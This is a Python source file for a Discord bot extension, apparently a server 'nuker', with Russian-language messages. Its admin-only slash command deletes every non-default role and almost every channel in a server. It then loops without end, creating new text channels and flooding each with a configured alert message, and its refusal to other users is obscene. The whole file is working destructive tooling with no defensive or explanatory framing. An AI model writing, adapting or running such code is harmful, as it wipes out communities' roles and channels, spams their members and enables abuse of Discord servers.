import disnake
from disnake.ext import commands
import asyncio
import logging
from config import admin_id, config_channel_name, config_alert_message

class Dora(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.slash_command()
    async def dora(self, interaction: disnake.ApplicationCommandInteraction):
        if str(interaction.user.id) != admin_id:
            await interaction.response.send_message(content="у вас нету доступа для использования этой команде так что вы можете пойти нахуй.", ephemeral=True)
            return
        guild = interaction.guild
        if not guild.me.guild_permissions.manage_channels:
            await interaction.response.send_message("у бота нет прав  для выполнения этой команды.", ephemeral=True)
            return
        await interaction.response.send_message(content="Успешно сделано! Начинаю удаление каналов, а далее пересоздаю их с названием из вашего конфига!", ephemeral=True)
        await self.start_mass_channel_replace(guild)

    async def start_mass_channel_replace(self, guild):
        deleted_channels = 0
        deleted_roles = 0
        for role in guild.roles:
            if role.is_default():
                continue
            try:
                await role.delete(reason="mass replace")
                deleted_roles += 1
            except Exception:
                pass
            await asyncio.sleep(0)
        for channel in guild.channels:
            if channel.name == config_channel_name:
                continue
            try:
                await channel.delete(reason="mass replace")
                deleted_channels += 1
            except Exception:
                pass
            await asyncio.sleep(0)
        await asyncio.sleep(0)
        category = None
        for cat in guild.categories:
            if cat.name == config_channel_name:
                category = cat
                break
        from config import channel_create_delay, spam_delay
        async def spam_channel(channel):
            while True:
                try:
                    await channel.send(config_alert_message)
                except Exception:
                    pass
                await asyncio.sleep(spam_delay)
        async def create_and_spam():
            while True:
                try:
                    channel = await guild.create_text_channel(name=f"{config_channel_name}-{int(asyncio.get_event_loop().time()*100000)}", category=category)
                    asyncio.create_task(spam_channel(channel))
                except Exception:
                    pass
                await asyncio.sleep(channel_create_delay)
        asyncio.create_task(create_and_spam())

def setup(bot):
    bot.add_cog(Dora(bot))
